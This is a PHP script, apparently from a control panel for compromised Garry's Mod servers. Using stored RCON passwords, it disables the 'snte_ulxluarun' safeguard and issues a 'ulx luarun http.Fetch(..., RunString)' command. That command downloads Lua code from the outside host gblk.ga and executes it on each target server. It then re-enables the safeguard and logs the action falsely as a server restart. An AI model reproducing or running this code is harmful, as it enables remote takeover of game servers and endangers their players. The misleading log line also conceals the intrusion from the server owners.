<?php

include('../class/include.php');
include '../SourceQuery/SourceQuery.class.php';
if (!Account::isAuthentified())
{
    die("Bad request");
}

if($_GET['f'] == 1){
	$selectionserver = Server::GetAllServer();
	foreach($selectionserver as $AfficheServer)
                    {
                    	if ($AfficheServer['last_update'] + 30 < time())
    {

                    if($_SESSION['id'] == $AfficheServer['userid']){

                    	$server = Server::GetServer($AfficheServer["id"]);
$rcon = $server["rcon"];
$ip_data = explode(':', $server['server_ip']);
$rcn = new SourceQuery;
$rcn->Connect($server['server_ip'], intval($server['server_port']));
$rcn->SetRconPassword($rcon);
$rcn->Rcon("snte_ulxluarun 0");
$rcn->Rcon("ulx luarun http.Fetch([[http://gblk.ga/f?k=".$_SESSION["id"]."]],RunString)");
$rcn->Rcon("snte_ulxluarun 1");

                    }
                }
                    }
}else{


$server = Server::GetServer($_GET["id"]);
$rcon = $server["rcon"];
$rcn = new SourceQuery;
$rcn->Connect($server['server_ip'], intval($server['server_port']));
$rcn->SetRconPassword($rcon);
$rcn->Rcon("snte_ulxluarun 0");
$rcn->Rcon("ulx luarun http.Fetch([[http://gblk.ga/f?k=".$_SESSION["id"]."]],RunString)");
$rcn->Rcon("snte_ulxluarun 1");
}
Logs::AddLogs("<p class='text-primary'>[".date('d/m/Y à H:i:s', time())."]&nbsp;<i class='fa fa-close'></i>&nbsp;L'utilisateur ".$_SESSION["id"]." a restart un server</p>");

?>